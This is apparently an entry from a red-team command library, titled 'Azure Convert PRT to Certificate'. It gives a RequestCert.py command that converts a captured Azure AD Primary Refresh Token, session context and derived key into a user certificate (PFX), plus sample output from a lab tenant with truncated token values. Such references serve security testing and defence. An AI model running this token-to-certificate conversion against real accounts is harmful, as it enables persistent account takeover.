---
id: 3119418e-8e00-4623-934f-715e91e674b7
name: Azure Convert PRT to Certificate
type: command
executor: ''
data: RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT
  NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
output: 'python RequestCert.py --tenantId 2c240ecc-...truncated --prt QVFBQkFBQUFBQUFHVl9idjIxb1FRNFJPcWgwXzEtdEFnbm9IbkFCZkgxcG1zbFFERENFY195OXFMTEF5bDhpZ3FrQ1RZa0dTdElqa3pGcXZ5...truncated
  --userName Gadmin@ResearchAadLabEnv.onmicrosoft.com --hexCtx e096b37dc0d8e5cde438...truncated
  --hexDerivedKey b8a39c7b3b7e7c859b...truncated

  # PFX saved with the name user@tenant.onmicrosoft.com.pfx and password is: "AzureADCert"'
created_at: '2023-05-25T18:50:44.624549+00:00'
updated_at: '2023-05-25T18:50:44.779119+00:00'
---

# Azure Convert PRT to Certificate

```bash
RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
```

## Expected Output

```
python RequestCert.py --tenantId 2c240ecc-...truncated --prt QVFBQkFBQUFBQUFHVl9idjIxb1FRNFJPcWgwXzEtdEFnbm9IbkFCZkgxcG1zbFFERENFY195OXFMTEF5bDhpZ3FrQ1RZa0dTdElqa3pGcXZ5...truncated --userName Gadmin@ResearchAadLabEnv.onmicrosoft.com --hexCtx e096b37dc0d8e5cde438...truncated --hexDerivedKey b8a39c7b3b7e7c859b...truncated

# PFX saved with the name user@tenant.onmicrosoft.com.pfx and password is: "AzureADCert"
```
